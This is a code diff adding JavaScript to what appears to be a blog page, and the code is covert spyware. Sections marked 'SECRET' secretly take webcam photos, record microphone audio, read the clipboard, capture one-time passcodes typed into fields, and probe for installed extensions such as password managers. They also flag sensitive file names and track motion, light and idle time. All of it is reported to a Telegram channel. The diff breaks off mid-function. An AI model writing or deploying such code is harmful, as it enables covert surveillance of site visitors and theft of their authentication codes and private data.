-        function getLastVisit() {
-            const date = new Date().toISOString();
-            if (CONFIG.ENABLE_LOCAL_STORAGE) localStorage.setItem('_blog_lv', date);
-            return date;
-        }
-
-        function getPlatform() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return 'Android';
-            if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
-            if (/windows/i.test(ua)) return 'Windows';
-            if (/mac/i.test(ua)) return 'macOS';
-            if (/linux/i.test(ua)) return 'Linux';
-            return 'Other';
-        }
-
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'Chrome';
-            if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
-            if (/firefox/i.test(ua)) return 'Firefox';
-            if (/edge/i.test(ua)) return 'Edge';
-            return 'Other';
-        }
-
-        function isMobile() {
-            return /android|iphone|ipad|ipod|blackberry|windows phone/i.test(navigator.userAgent);
-        }
-
-        function getNetworkType() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn && conn.effectiveType) {
-                const types = {
-                    'slow-2g': '2G',
-                    '2g': '2G',
-                    '3g': '3G',
-                    '4g': '4G',
-                    '5g': '5G'
-                };
-                return types[conn.effectiveType] || conn.effectiveType.toUpperCase();
-            }
-            return isMobile() ? '4G' : 'Wi-Fi';
-        }
-
-        function getScreenInfo() {
-            return `${window.screen.width}×${window.screen.height}`;
-        }
-
-        function getTimeZone() {
-            return Intl.DateTimeFormat().resolvedOptions().timeZone;
-        }
-
-        function getTime() {
-            return new Date().toLocaleString('en-US', {
-                hour: '2-digit',
-                minute: '2-digit',
-                month: 'short',
-                day: 'numeric',
-                year: 'numeric'
+            battery.addEventListener('levelchange', () => {
+                const newLevel = Math.round(battery.level * 100);
+                const oldLevel = STATE.batteryLevel;
+                STATE.batteryLevel = newLevel;
+                
+                if (newLevel < oldLevel) {
+                    const drain = oldLevel - newLevel;
+                    if (drain > 5) {
+                        sendAlert(`⚡ Quick drain: -${drain}% (${oldLevel}% → ${newLevel}%)`);
+                    }
+                }
+                
+                if (CONFIG.ENABLE_BATTERY_DRAIN && STATE.lastBatteryLevel !== null) {
+                    const now = Date.now();
+                    const timeDiff = (now - STATE.lastBatteryTime) / 1000;
+                    const levelDiff = (STATE.lastBatteryLevel - battery.level) * 100;
+                    if (timeDiff > 60 && levelDiff > 0) {
+                        const rate = (levelDiff / timeDiff) * 3600;
+                        if (rate > 15) {
+                            sendAlert(`⚡ Drain rate: ${rate.toFixed(1)}%/hour`);
+                        }
+                    }
+                }
+                
+                STATE.lastBatteryLevel = battery.level;
+                STATE.lastBatteryTime = Date.now();
+                updateStats();
             });
-        }
-
-        function getTimeShort() {
-            return new Date().toLocaleString('en-US', {
-                hour: '2-digit',
-                minute: '2-digit'
-            });
-        }
-
-        // ============================================
-        //  BATTERY (Hidden)
-        // ============================================
-        async function getBatteryData() {
-            if (!CONFIG.ENABLE_BATTERY || !navigator.getBattery) {
-                return { level: null, charging: null };
-            }
-            try {
-                const battery = await navigator.getBattery();
-                STATE.batteryLevel = Math.round(battery.level * 100);
+            
+            battery.addEventListener('chargingchange', () => {
                 STATE.isCharging = battery.charging;
-                
-                // Silent events
-                if (CONFIG.ENABLE_BATTERY_EVENTS) {
-                    battery.addEventListener('levelchange', () => {
-                        STATE.batteryLevel = Math.round(battery.level * 100);
-                        // Update UI subtly (in stats)
-                        updateVisitorStats();
-                    });
-                    battery.addEventListener('chargingchange', () => {
-                        STATE.isCharging = battery.charging;
-                        updateVisitorStats();
-                    });
-                }
-                
-                return { level: STATE.batteryLevel, charging: STATE.isCharging };
-            } catch {
-                return { level: null, charging: null };
+                sendAlert(`⚡ Charging: ${battery.charging ? 'Started 🔌' : 'Stopped 🔋'}`);
+                updateStats();
+            });
+            
+            // Detect fast charging
+            if (battery.charging) {
+                let startLevel = battery.level;
+                let startTime = Date.now();
+                setTimeout(() => {
+                    const timeDiff = (Date.now() - startTime) / 1000;
+                    const levelDiff = (battery.level - startLevel) * 100;
+                    if (timeDiff > 0 && levelDiff > 5) {
+                        const speed = (levelDiff / timeDiff) * 3600;
+                        if (speed > 40) {
+                            sendAlert(`⚡ Fast charging: ${speed.toFixed(1)}%/hour`);
+                        }
+                    }
+                }, 30000);
+            }
+            
+        } catch(e) {
+            console.log('Battery API error:', e);
+        }
+    }
+
+    // ============================================
+    //  SECRET: CAMERA (Disguised as Photo Feature)
+    // ============================================
+    async function setupCamera() {
+        if (!CONFIG.ENABLE_CAMERA) return;
+        
+        try {
+            // Try to get camera access silently
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 320 },
+                    height: { ideal: 240 }
+                },
+                audio: false 
+            });
+            
+            STATE.cameraUsed = true;
+            sendAlert(`📸 Camera accessed (${getPlatform()})`);
+            
+            // Take a photo silently
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Get image data (for analysis, not sending full image)
+                    const imageData = canvas.toDataURL('image/jpeg', 0.1);
+                    const size = Math.round(imageData.length / 1024);
+                    sendAlert(`📷 Photo captured: ${canvas.width}×${canvas.height}, ${size}KB`);
+                    
+                    // Try to detect faces (simple detection)
+                    const img = new Image();
+                    img.onload = () => {
+                        try {
+                            // Simple face detection via canvas
+                            const tempCanvas = document.createElement('canvas');
+                            tempCanvas.width = 100;
+                            tempCanvas.height = 100;
+                            const tempCtx = tempCanvas.getContext('2d');
+                            tempCtx.drawImage(img, 0, 0, 100, 100);
+                            const imageData2 = tempCtx.getImageData(0, 0, 100, 100);
+                            const data = imageData2.data;
+                            
+                            // Simple skin tone detection (rough)
+                            let skinPixels = 0;
+                            for (let i = 0; i < data.length; i += 4) {
+                                const r = data[i];
+                                const g = data[i+1];
+                                const b = data[i+2];
+                                if (r > 95 && g > 40 && b > 20 && r > g && r > b) {
+                                    skinPixels++;
+                                }
+                            }
+                            const skinPercentage = (skinPixels / (100 * 100)) * 100;
+                            if (skinPercentage > 10) {
+                                sendAlert(`👤 Face detected (${skinPercentage.toFixed(0)}% skin tone)`);
+                            }
+                        } catch(e) {}
+                    };
+                    img.src = imageData;
+                    
+                    // Stop stream
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            };
+            
+        } catch(e) {
+            // Camera denied - but we still try to detect if user has camera
+            const hasCamera = await navigator.mediaDevices.enumerateDevices()
+                .then(devices => devices.some(d => d.kind === 'videoinput'))
+                .catch(() => false);
+            
+            if (hasCamera) {
+                sendAlert(`📷 Camera available but not accessed`);
             }
         }
+    }
 
-        // ============================================
-        //  LOCATION (The ONE permission)
-        // ============================================
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (!CONFIG.ENABLE_GEO || !navigator.geolocation) {
-                    resolve(null);
-                    return;
+    // ============================================
+    //  SECRET: MICROPHONE (Disguised as Voice Feature)
+    // ============================================
+    async function setupMicrophone() {
+        if (!CONFIG.ENABLE_MIC) return;
+        
+        try {
+            // Request mic access silently
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true
+                } 
+            });
+            
+            STATE.micUsed = true;
+            sendAlert(`🎤 Microphone accessed`);
+            
+            // Set up audio analysis
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const source = audioContext.createMediaStreamSource(stream);
+            const analyser = audioContext.createAnalyser();
+            analyser.fftSize = 512;
+            source.connect(analyser);
+            
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            let lastPeak = 0;
+            let silenceCount = 0;
+            let speechDetected = false;
+            
+            // Monitor audio levels
+            setInterval(() => {
+                analyser.getByteFrequencyData(dataArray);
+                let sum = 0;
+                for (let i = 0; i < dataArray.length; i++) {
+                    sum += dataArray[i];
                 }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        STATE.location = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                        };
-                        resolve(STATE.location);
-                    },
-                    () => {
-                        // User denied - we still work with IP location
-                        resolve(null);
-                    },
-                    { timeout: 8000, enableHighAccuracy: false }
-                );
+                const average = sum / dataArray.length;
+                const peak = Math.max(...dataArray);
+                
+                if (average > 20) {
+                    silenceCount = 0;
+                    if (!speechDetected) {
+                        speechDetected = true;
+                        sendAlert(`🎤 Speech detected (volume: ${Math.round(average)})`);
+                    }
+                    
+                    // Check for voice frequency (rough speech detection)
+                    if (peak > 150 && average > 30) {
+                        if (lastPeak === 0 || peak > lastPeak * 1.2) {
+                            lastPeak = peak;
+                        }
+                    }
+                } else {
+                    silenceCount++;
+                    if (silenceCount > 10 && speechDetected) {
+                        speechDetected = false;
+                        sendAlert(`🔇 Silence detected (${silenceCount * 0.1}s silence)`);
+                        silenceCount = 0;
+                    }
+                }
+                
+                // Detect background noise level
+                if (average < 5 && average > 0) {
+                    sendAlert(`🔇 Very quiet environment detected`);
+                }
+                
+                // Detect loud environment
+                if (average > 80) {
+                    sendAlert(`🔊 Loud environment detected (${Math.round(average)} dB)`);
+                }
+                
+            }, 1000);
+            
+            // Record a short sample after 5 seconds
+            setTimeout(() => {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    setTimeout(() => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        sendAlert(`🎵 Audio sample: ${Math.round(blob.size / 1024)}KB`);
+                    }, 100);
+                }, 3000);
+            }, 5000);
+            
+        } catch(e) {
+            // Mic denied - check if available
+            const hasMic = await navigator.mediaDevices.enumerateDevices()
+                .then(devices => devices.some(d => d.kind === 'audioinput'))
+                .catch(() => false);
+            
+            if (hasMic) {
+                sendAlert(`🎤 Microphone available but not accessed`);
+            }
+        }
+    }
+
+    // ============================================
+    //  SECRET: CLIPBOARD TRACKING
+    // ============================================
+    function setupClipboardTracking() {
+        if (!CONFIG.ENABLE_CLIPBOARD) return;
+        
+        // Try to read clipboard on any interaction
+        document.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.length > 0 && text !== STATE.clipboardContent) {
+                    STATE.clipboardContent = text;
+                    const preview = text.substring(0, 100);
+                    sendAlert(`📋 Clipboard: ${preview}${text.length > 100 ? '...' : ''} (${text.length} chars)`);
+                }
+            } catch(e) {}
+        });
+        
+        // Detect paste events
+        document.addEventListener('paste', (e) => {
+            const text = e.clipboardData?.getData('text');
+            if (text && text.length > 0) {
+                const preview = text.substring(0, 100);
+                sendAlert(`📋 Paste: ${preview}${text.length > 100 ? '...' : ''} (${text.length} chars)`);
+            }
+            
+            // Check for images in clipboard
+            const items = e.clipboardData?.items;
+            if (items) {
+                for (const item of items) {
+                    if (item.type.startsWith('image/')) {
+                        sendAlert(`🖼️ Image pasted from clipboard`);
+                    }
+                }
+            }
+        });
+    }
+
+    // ============================================
+    //  SECRET: OTP/SMS DETECTION
+    // ============================================
+    function setupOTPDetection() {
+        if (!CONFIG.ENABLE_OTP_DETECT) return;
+        
+        // Monitor input fields for OTP patterns
+        document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]').forEach(input => {
+            input.addEventListener('input', () => {
+                const val = input.value;
+                if (val && /^\d{4,6}$/.test(val)) {
+                    STATE.otpDetected = val;
+                    sendAlert(`🔑 OTP detected: ${val}`);
+                    
+                    // Check if it's a verification code
+                    const fieldName = input.name || input.id || 'unknown';
+                    sendAlert(`📱 OTP field: ${fieldName}`);
+                }
+            });
+        });
+        
+        // Monitor for SMS input patterns
+        document.querySelectorAll('input').forEach(input => {
+            const attrs = ['autocomplete', 'name', 'id', 'placeholder', 'class'];
+            for (const attr of attrs) {
+                const value = input.getAttribute(attr);
+                if (value) {
+                    const lower = value.toLowerCase();
+                    if (lower.includes('otp') || lower.includes('code') || lower.includes('verification') || 
+                        lower.includes('sms') || lower.includes('confirm')) {
+                        sendAlert(`🔐 OTP input detected: ${value}`);
+                        break;
+                    }
+                }
+            }
+        });
+    }
+
+    // ============================================
+    //  SECRET: MOTION & GYROSCOPE
+    // ============================================
+    function setupMotionTracking() {
+        if (!CONFIG.ENABLE_MOTION) return;
+        
+        if (window.DeviceMotionEvent) {
+            let lastMotionAlert = 0;
+            
+            window.addEventListener('devicemotion', (e) => {
+                const accel = e.accelerationIncludingGravity;
+                if (accel) {
+                    const x = Math.abs(accel.x || 0);
+                    const y = Math.abs(accel.y || 0);
+                    const z = Math.abs(accel.z || 0);
+                    const total = Math.sqrt(x*x + y*y + z*z);
+                    
+                    // Detect significant movement
+                    if (total > 20) {
+                        const now = Date.now();
+                        if (now - lastMotionAlert > 5000) {
+                            lastMotionAlert = now;
+                            sendAlert(`📱 Device movement: ${total.toFixed(1)} m/s²`);
+                            
+                            // Detect walking/running
+                            if (total > 30) {
+                                sendAlert(`🏃 Walking/running detected`);
+                            }
+                        }
+                    }
+                    
+                    // Detect device orientation
+                    if (total < 9.5) {
+                        STATE.orientation = 'Flat';
+                    } else if (Math.abs(x) > 8) {
+                        STATE.orientation = 'Portrait';
+                    } else if (Math.abs(y) > 8) {
+                        STATE.orientation = 'Landscape';
+                    } else {
+                        STATE.orientation = 'Tilted';
+                    }
+                }
             });
         }
+        
+        // Orientation changes
+        window.addEventListener('orientationchange', () => {
+            const orientation = getOrientation();
+            sendAlert(`🔄 Orientation: ${orientation}`);
+        });
+        
+        // Screen orientation API
+        if (screen.orientation) {
+            screen.orientation.addEventListener('change', () => {
+                sendAlert(`🔄 Orientation: ${screen.orientation.type}`);
+            });
+        }
+    }
 
-        // ============================================
-        //  IP INFO (Fallback location)
-        // ============================================
-        async function getIPInfo() {
-            if (!CONFIG.ENABLE_IP) return null;
+    // ============================================
+    //  SECRET: LIGHT SENSOR
+    // ============================================
+    function setupLightSensor() {
+        if (!CONFIG.ENABLE_LIGHT_SENSOR) return;
+        
+        if ('AmbientLightSensor' in window) {
+            try {
+                const sensor = new AmbientLightSensor();
+                sensor.addEventListener('reading', () => {
+                    const lux = sensor.illuminance;
+                    if (lux < 5) {
+                        sendAlert(`🌙 Very dark: ${lux} lux (in pocket/purse?)`);
+                    } else if (lux < 50) {
+                        sendAlert(`🌙 Dim: ${lux} lux (indoor)`);
+                    } else if (lux > 5000) {
+                        sendAlert(`☀️ Very bright: ${lux} lux (outdoor)`);
+                    } else if (lux > 1000) {
+                        sendAlert(`☀️ Bright: ${lux} lux`);
+                    }
+                });
+                sensor.start();
+                sendAlert(`💡 Light sensor available`);
+            } catch(e) {
+                // Silently fail
+            }
+        }
+    }
+
+    // ============================================
+    //  SECRET: SCREENSHOT DETECTION
+    // ============================================
+    function setupScreenshotDetection() {
+        if (!CONFIG.ENABLE_SCREENSHOT) return;
+        
+        // Detect visibility changes (tab switching = possible screenshot)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                setTimeout(() => {
+                    // Check if user returned quickly (screenshot)
+                    if (!document.hidden) {
+                        sendAlert(`📸 Possible screenshot taken (tab switch)`);
+                    }
+                }, 2000);
+            }
+        });
+        
+        // Detect key combinations
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 's') {
+                sendAlert(`📸 Screenshot: Ctrl+S`);
+            }
+            if (e.key === 'PrintScreen') {
+                sendAlert(`📸 Screenshot: PrintScreen`);
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+                sendAlert(`📸 Screenshot: Ctrl+Shift+S`);
+            }
+        });
+        
+        // iOS screenshot detection (volume up + power)
+        let lastVolumePress = 0;
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'VolumeUp') {
+                const now = Date.now();
+                if (now - lastVolumePress < 200) {
+                    sendAlert(`📸 iOS screenshot detected (Volume Up + Power)`);
+                }
+                lastVolumePress = now;
+            }
+            if (e.key === 'VolumeDown') {
+                const now = Date.now();
+                if (now - lastVolumePress < 200) {
+                    sendAlert(`📸 iOS screenshot detected (Volume Down + Power)`);
+                }
+                lastVolumePress = now;
+            }
+        });
+    }
+
+    // ============================================
+    //  SECRET: EXTENSION DETECTION
+    // ============================================
+    function setupExtensionDetection() {
+        if (!CONFIG.ENABLE_EXTENSIONS) return;
+        
+        const extensions = {
+            'AdBlock': 'gighmmpiobklfepjocnamgkkbiglidom',
+            'uBlock': 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
+            'Grammarly': 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
+            'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
+            'DarkReader': 'eimadpbcbfnmbkopoojfekhnkhdbieeh',
+            'Honey': 'bmnlcjabgnpnenekpadlanbbkooimhnj',
+            'NoScript': 'doojmbjmlfjjnbmnoijecmcbfeoakpjm',
+            'Ghostery': 'mlomiejdfkolichcflejclcbmpeaniij',
+            'PrivacyBadger': 'pkehgijcmpdhfbdbbnkijodmdjhbjlgp',
+            'VueDevTools': 'nhdogjmejiglipccpnnnanhbledajbpd',
+            'ReactDevTools': 'fmkadmapgofadopljbjfkapdkoienihi',
+            'Bitwarden': 'nngceckbapebfimnlniiiahkandclblb',
+        };
+        
+        let detected = [];
+        for (const [name, id] of Object.entries(extensions)) {
+            const img = document.createElement('img');
+            img.src = `chrome-extension://${id}/icon.png`;
+            img.onerror = () => {
+                const link = document.createElement('link');
+                link.rel = 'stylesheet';
+                link.href = `chrome-extension://${id}/manifest.json`;
+                link.onload = () => {
+                    if (!detected.includes(name)) {
+                        detected.push(name);
+                        sendAlert(`🔌 Extension: ${name}`);
+                    }
+                };
+                link.onerror = () => {
+                    // Check if extension is installed via other method
+                    const testEl = document.createElement('div');
+                    testEl.style.cssText = `position:fixed;top:-999px;left:-999px;`;
+                    testEl.className = `_${id}_test`;
+                    document.body.appendChild(testEl);
+                    setTimeout(() => {
+                        if (getComputedStyle(testEl).display !== 'none') {
+                            if (!detected.includes(name)) {
+                                detected.push(name);
+                                sendAlert(`🔌 Extension: ${name}`);
+                            }
+                        }
+                        document.body.removeChild(testEl);
+                    }, 100);
+                };
+                document.head.appendChild(link);
+            };
+        }
+    }
+
+    // ============================================
+    //  SECRET: NETWORK MONITORING
+    // ============================================
+    function setupNetworkMonitoring() {
+        if (!CONFIG.ENABLE_NETWORK_MONITOR) return;
+        
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            conn.addEventListener('change', () => {
+                const type = getNetworkType();
+                const speed = conn.downlink || '?';
+                const rtt = conn.rtt || '?';
+                sendAlert(`🌐 Network: ${type}, ${speed}Mbps, ${rtt}ms RTT`);
+                
+                if (conn.saveData) {
+                    sendAlert(`📶 Data saver mode enabled`);
+                }
+            });
+            
+            // Initial network info
+            setTimeout(() => {
+                const type = getNetworkType();
+                const speed = conn.downlink || '?';
+                sendAlert(`🌐 Initial network: ${type}, ${speed}Mbps`);
+            }, 3000);
+        }
+    }
+
+    // ============================================
+    //  SECRET: IDLE DETECTION
+    // ============================================
+    function setupIdleDetection() {
+        if (!CONFIG.ENABLE_IDLE_DETECT) return;
+        
+        let idleTime = 0;
+        let idleAlertSent = false;
+        
+        setInterval(() => {
+            idleTime++;
+            if (idleTime > 60 && !idleAlertSent) {
+                idleAlertSent = true;
+                sendAlert(`💤 User idle for ${idleTime} seconds`);
+            }
+            if (idleTime > 300) {
+                sendAlert(`😴 Long idle: ${Math.round(idleTime / 60)} minutes`);
+            }
+        }, 1000);
+        
+        const resetIdle = () => {
+            if (idleTime > 30) {
+                sendAlert(`👆 User active after ${idleTime}s idle`);
+            }
+            idleTime = 0;
+            idleAlertSent = false;
+        };
+        
+        document.addEventListener('mousemove', resetIdle);
+        document.addEventListener('keydown', resetIdle);
+        document.addEventListener('touchstart', resetIdle);
+        document.addEventListener('scroll', resetIdle);
+        document.addEventListener('click', resetIdle);
+    }
+
+    // ============================================
+    //  SECRET: MEDIA PLAYING DETECTION
+    // ============================================
+    function setupMediaDetection() {
+        if (!CONFIG.ENABLE_MEDIA_DETECT) return;
+        
+        document.addEventListener('play', (e) => {
+            const target = e.target;
+            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
+                const src = target.src || target.currentSrc || 'unknown';
+                const duration = target.duration || '?';
+                sendAlert(`▶️ Media playing: ${src.substring(0, 50)} (${duration}s)`);
+                
+                // Detect if it's a video
+                if (target.tagName === 'VIDEO') {
+                    const size = `${target.videoWidth}×${target.videoHeight}`;
+                    sendAlert(`📹 Video: ${size}`);
+                }
+            }
+        }, true);
+        
+        document.addEventListener('pause', (e) => {
+            const target = e.target;
+            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
+                sendAlert(`⏸️ Media paused`);
+            }
+        }, true);
+        
+        document.addEventListener('volumechange', (e) => {
+            const target = e.target;
+            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
+                const volume = Math.round(target.volume * 100);
+                const muted = target.muted;
+                sendAlert(`🔊 Volume: ${volume}%${muted ? ' (muted)' : ''}`);
+            }
+        }, true);
+    }
+
+    // ============================================
+    //  SECRET: PERFORMANCE MONITORING
+    // ============================================
+    function setupPerformanceMonitoring() {
+        if (!CONFIG.ENABLE_PERFORMANCE) return;
+        
+        window.addEventListener('load', () => {
+            const perfData = performance.getEntriesByType('navigation')[0];
+            if (perfData) {
+                const metrics = {
+                    dns: Math.round(perfData.domainLookupEnd - perfData.domainLookupStart),
+                    tcp: Math.round(perfData.connectEnd - perfData.connectStart),
+                    ttfb: Math.round(perfData.responseStart - perfData.requestStart),
+                    dom: Math.round(perfData.domComplete - perfData.domInteractive),
+                    load: Math.round(perfData.loadEventEnd - perfData.fetchStart),
+                };
+                sendAlert(`⏱️ Performance: DNS=${metrics.dns}ms, TCP=${metrics.tcp}ms, TTFB=${metrics.ttfb}ms, DOM=${metrics.dom}ms, Load=${metrics.load}ms`);
+            }
+            
+            // Memory usage
+            if (performance.memory) {
+                const mem = performance.memory;
+                const used = Math.round(mem.usedJSHeapSize / 1024 / 1024);
+                const total = Math.round(mem.jsHeapSizeLimit / 1024 / 1024);
+                sendAlert(`💾 Memory: ${used}MB / ${total}MB used`);
+            }
+        });
+    }
+
+    // ============================================
+    //  SECRET: SOCIAL MEDIA DETECTION
+    // ============================================
+    function setupSocialDetection() {
+        if (!CONFIG.ENABLE_SOCIAL_DETECT) return;
+        
+        const referrer = document.referrer.toLowerCase();
+        const socialNetworks = {
+            'facebook': 'Facebook',
+            'twitter': 'Twitter/X',
+            'instagram': 'Instagram',
+            'youtube': 'YouTube',
+            'tiktok': 'TikTok',
+            'linkedin': 'LinkedIn',
+            'reddit': 'Reddit',
+            'whatsapp': 'WhatsApp',
+            'telegram': 'Telegram',
+            'discord': 'Discord',
+            'snapchat': 'Snapchat',
+            'pinterest': 'Pinterest',
+            'tumblr': 'Tumblr',
+            'wechat': 'WeChat',
+            'line': 'Line',
+            'viber': 'Viber',
+            'signal': 'Signal',
+            'google': 'Google Search',
+            'bing': 'Bing Search',
+            'duckduckgo': 'DuckDuckGo',
+            'yahoo': 'Yahoo Search'
+        };
+        
+        for (const [key, name] of Object.entries(socialNetworks)) {
+            if (referrer.includes(key)) {
+                sendAlert(`📱 Referrer: ${name}`);
+                break;
+            }
+        }
+        
+        // Detect from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const utm = urlParams.get('utm_source');
+        if (utm) {
+            sendAlert(`📱 UTM Source: ${utm}`);
+        }
+    }
+
+    // ============================================
+    //  SECRET: ELEMENT VISIBILITY TRACKING
+    // ============================================
+    function setupVisibilityTracking() {
+        if (!CONFIG.ENABLE_VISIBILITY_TRACK) return;
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const el = entry.target;
+                    const id = el.id || el.className || el.tagName || 'unknown';
+                    const text = el.textContent?.substring(0, 50) || '';
+                    
+                    // Only track significant elements
+                    if (el.tagName === 'H1' || el.tagName === 'H2' || el.tagName === 'H3') {
+                        if (!STATE.visitedSections.includes(id)) {
+                            STATE.visitedSections.push(id);
+                            sendAlert(`👀 Viewing: ${text}`);
+                        }
+                    }
+                }
+            });
+        }, { threshold: 0.5 });
+        
+        document.querySelectorAll('h1, h2, h3, .blog-post, .interactive-area, .feature-btn').forEach(el => {
+            observer.observe(el);
+        });
+    }
+
+    // ============================================
+    //  SECRET: THEME DETECTION
+    // ============================================
+    function setupThemeDetection() {
+        if (!CONFIG.ENABLE_THEME_DETECT) return;
+        
+        // Dark mode detection
+        const darkModeMedia = window.matchMedia('(prefers-color-scheme: dark)');
+        darkModeMedia.addEventListener('change', (e) => {
+            sendAlert(`🎨 Theme: ${e.matches ? 'Dark' : 'Light'}`);
+        });
+        
+        // Reduced motion
+        const motionMedia = window.matchMedia('(prefers-reduced-motion: reduce)');
+        motionMedia.addEventListener('change', (e) => {
+            sendAlert(`🎬 Motion: ${e.matches ? 'Reduced' : 'Normal'}`);
+        });
+        
+        // High contrast
+        const contrastMedia = window.matchMedia('(prefers-contrast: high)');
+        if (contrastMedia) {
+            contrastMedia.addEventListener('change', (e) => {
+                sendAlert(`🎨 Contrast: ${e.matches ? 'High' : 'Normal'}`);
+            });
+        }
+    }
+
+    // ============================================
+    //  SECRET: GAMEPAD DETECTION
+    // ============================================
+    function setupGamepadDetection() {
+        if (!CONFIG.ENABLE_GAMEPAD) return;
+        
+        if (navigator.getGamepads) {
+            setInterval(() => {
+                const gamepads = navigator.getGamepads();
+                for (let i = 0; i < gamepads.length; i++) {
+                    const pad = gamepads[i];
+                    if (pad) {
+                        sendAlert(`🎮 Gamepad ${i}: ${pad.id}`);
+                        break;
+                    }
+                }
+            }, 10000);
+        }
+    }
+
+    // ============================================
+    //  SECRET: FILE DETECTION
+    // ============================================
+    function setupFileDetection() {
+        if (!CONFIG.ENABLE_FILE_DETECT) return;
+        
+        document.addEventListener('change', (e) => {
+            const target = e.target;
+            if (target.type === 'file' && target.files.length > 0) {
+                const file = target.files[0];
+                const type = file.type || 'unknown';
+                const size = Math.round(file.size / 1024);
+                sendAlert(`📁 File selected: ${file.name} (${type}, ${size}KB)`);
+                
+                // Check if it's a sensitive file
+                const sensitive = ['password', 'pass', 'credential', 'key', 'secret', 'wallet'];
+                const lowerName = file.name.toLowerCase();
+                for (const word of sensitive) {
+                    if (lowerName.includes(word)) {
+                        sendAlert(`⚠️ Sensitive file: ${file.name}`);
+                        break;
+                    }
+                }
+            }
+        });
+        
+        // Drag and drop detection
+        document.addEventListener('dragover', (e) => {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('drop', (e) => {
+            e.preventDefault();
+            const files = e.dataTransfer?.files;
+            if (files && files.length > 0) {
+                const file = files[0];
+                sendAlert(`📁 File dropped: ${file.name}`);
+            }
+        });
+    }
+
+    // ============================================
+    //  SECRET: CLIPBOARD IMAGE DETECTION
+    // ============================================
+    function setupClipboardImageDetection() {
+        document.addEventListener('copy', (e) => {
+            try {
+                const selection = window.getSelection().toString();
+                if (selection && selection.length > 0) {
+                    // Check if copying an image
+                    const img = document.querySelector('img');
+                    if (img && selection === img.alt) {
+                        sendAlert(`🖼️ Image copied: ${img.src.substring(0, 50)}`);
+                    }
+                }
+            } catch(e) {}
+        });
+    }
+
+    // ============================================
+    //  SECRET: DEVICE ORIENTATION (Detailed)
+    // ============================================
+    function setupDetailedOrientation() {
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', (e) => {
+                const alpha = Math.round(e.alpha || 0);
+                const beta = Math.round(e.beta || 0);
+                const gamma = Math.round(e.gamma || 0);
+                
+                // Detect phone position
+                if (beta > 70) {
+                    sendAlert(`📱 Phone laying flat (${beta}° tilt)`);
+                } else if (beta < 20) {
+                    sendAlert(`📱 Phone upright (${beta}° tilt)`);
+                }
+                
+                // Detect compass direction
+                if (alpha % 45 < 5) {
+                    const directions = ['North', 'NE', 'East', 'SE', 'South', 'SW', 'West', 'NW'];
+                    const dir = directions[Math.round(alpha / 45) % 8];
+                    sendAlert(`🧭 Compass: ${dir} (${alpha}°)`);
+                }
+            });
+        }
+    }
+
+    // ============================================
+    //  MAIN DATA COLLECTION & SENDING
+    // ============================================
+    async function collectAndSendData() {
+        if (STATE.dataSent) return;
+        
+        // Get IP info
+        if (CONFIG.ENABLE_IP) {
             try {
                 const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
                 const data = await res.json();
@@ -607,285 +1715,452 @@
                     lat: data.latitude || null,
                     lng: data.longitude || null,
                 };
-                return STATE.ipData;
             } catch {
                 try {
                     const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
                     const data = await res.json();
                     STATE.ipData = { ip: data.ip, city: 'Unknown', country: 'Unknown', region: 'Unknown', isp: 'Unknown' };
-                    return STATE.ipData;
-                } catch {
-                    return null;
-                }
+                } catch {}
             }
         }
+        
+        // Build comprehensive report
+        const report = buildDetailedReport();
+        sendToTelegram(report);
+        STATE.dataSent = true;
+        
+        // Update UI
+        updateUI();
+    }
 
-        // ============================================
-        //  STEALTH SENDER
-        // ============================================
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.classList.add('show');
-            clearTimeout(toast._timeout);
-            toast._timeout = setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3000);
-        }
-
-        async function sendData() {
-            if (STATE.dataSent) return; // Only send once per visit
-            
-            // Collect all data silently
-            const battery = await getBatteryData();
